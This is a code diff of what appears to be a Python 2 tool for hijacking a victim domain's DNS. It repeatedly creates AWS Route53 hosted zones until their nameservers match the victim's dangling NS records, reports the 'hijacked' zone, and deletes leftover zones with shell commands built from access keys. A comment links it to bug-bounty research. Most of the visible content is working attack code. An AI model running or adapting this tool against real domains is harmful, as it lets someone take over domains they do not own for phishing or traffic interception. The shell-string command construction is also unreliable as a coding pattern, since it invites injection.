@@ -73,10 +73,6 @@ if (sys.argv[5]=="-s" or sys.argv[5]=="--secretKey"):
 if len(sys.argv) >= 8:
 	if (sys.argv[7]=="-k" or sys.argv[7]=="--zonesToKeep"):
 		zones_to_keep =  ast.literal_eval(sys.argv[8])
-		print "below me is zones_to_keep"
-		print zones_to_keep
-		print type(zones_to_keep)
-		print len(zones_to_keep)
 try:
 	nsRecords = dns.resolver.query(victimDomain, 'NS')
 except:
@@ -111,6 +107,7 @@ try:
 		try: 
 			new_zone=0
 			new_zone, change_info = conn.create_hosted_zone(
+			# in honor of bagipro, we love your reports, we hope you never stop researching and participating in bug bounty
 		    victimDomain, comment='zaheck'
 			)
 			hosted_zone_id = new_zone.__dict__["id"]
@@ -130,7 +127,8 @@ try:
 				myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
 				myPrint("Check your AWS account, the work is done!","SECURE")
 				print "This is the hijacked Zone ID: " + str(hosted_zone_id)
-				print "This is the zone you hijacked: " + str(intersection)
+				hijacked_zone = next(iter(intersection))
+				print "This is the zone you hijacked: " + str(hijacked_zone)
 				successful_zone.append(hosted_zone_id)
 				created_zones.remove(hosted_zone_id)
 				print ""
@@ -147,78 +145,49 @@ except KeyboardInterrupt:
 	if len(created_zones) != 0 and quit == "y":
 		command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
 		out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-		# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "list-hosted-zones"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 		stdout,stderr = out.communicate()
-		print("This is stdout: " + str(stdout))
-		print("This is stderr: " + str(stderr))
 		json_data = None
+
 		if stdout != 'false':
-			print("Inside of IF1")
 			json_data = json.loads(stdout)
+		
 		remaining_zones = []
+		
 		for zone in json_data["HostedZones"]:
 			remaining_zones.append(str(zone["Id"].replace("/hostedzone/","")))
-
-		print "This is remaining_zones after going through json_data['HostedZones']"
-		print remaining_zones
 		
 		for zone in zones_to_keep:
 			remaining_zones.remove(zone)
 
-		print "This is remaining_zones after going through zones_to_keep"
-		print remaining_zones
-
 		if len(successful_zone) != 0:
 			remaining_zones.remove(successful_zone[0])
 
-		print "This is remaining_zones after going through successful_zone"
-		print remaining_zones
-
 		for zone in remaining_zones:
 			command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
-			# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "delete-hosted-zone", "--id " + zone], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-			print("This is the command I am about to run: " + str(command))
 			out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
 			stdout,stderr = out.communicate()
-			print("This is stdout: " + str(stdout))
-			print("This is stderr: " + str(stderr))
 
 	else:
 		exit()
 
 command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 list-hosted-zones"
 out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "list-hosted-zones"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 stdout,stderr = out.communicate()
-print("This is stdout: " + str(stdout))
-print("This is stderr: " + str(stderr))
 json_data = None
+
 if stdout != 'false':
-	print("Inside of IF2")
 	json_data = json.loads(stdout)
 remaining_zones = []
 for zone in json_data["HostedZones"]:
 	remaining_zones.append(str(zone["Id"].replace("/hostedzone/","")))
 
-print "This is remaining_zones after going through json_data['HostedZones']"
-print remaining_zones
-
 for zone in zones_to_keep:
 	remaining_zones.remove(zone)
 
-print "This is remaining_zones after going through zones_to_keep"
-print remaining_zones
-
 if len(successful_zone) != 0:
 	remaining_zones.remove(successful_zone[0])
-	print "This is remaining_zones after going through successful_zone"
-	print remaining_zones
 
 for zone in remaining_zones:
 	command = "AWS_ACCESS_KEY_ID="+accessKey+" AWS_SECRET_ACCESS_KEY="+secretKey+" aws route53 delete-hosted-zone --id " + str(zone)
-	# out = subprocess.Popen(["AWS_ACCESS_KEY_ID="+accessKey, "AWS_SECRET_ACCESS_KEY="+secretKey, "aws", "route53", "delete-hosted-zone", "--id " + zone], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-	print("This is the command I am about to run: " + str(command))
 	out = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
 	stdout,stderr = out.communicate()
-	print("This is stdout: " + str(stdout))
-	print("This is stderr: " + str(stderr))
